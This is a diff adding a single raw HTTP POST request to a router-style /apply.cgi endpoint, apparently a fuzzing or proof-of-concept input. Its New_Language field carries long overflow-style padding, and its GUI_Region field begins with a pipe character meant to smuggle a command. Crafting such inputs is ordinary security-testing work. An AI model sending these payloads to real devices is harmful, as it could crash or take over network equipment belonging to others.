@@ -1,0 +1,5 @@
+POST /apply.cgi?AUTO_download_language.htm timestamp= HTTP/1.1
+Content-Type: application/json
+Content-Length: 257
+
+New_Language=aaaWZQaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaa&lang_in_flash=Authorization:&GUI_Region=|wzq&%20timestamp=wzqwzqwzq&submit_flag=qos_delmac&upgrade_yes_no=wzqwzqwzq
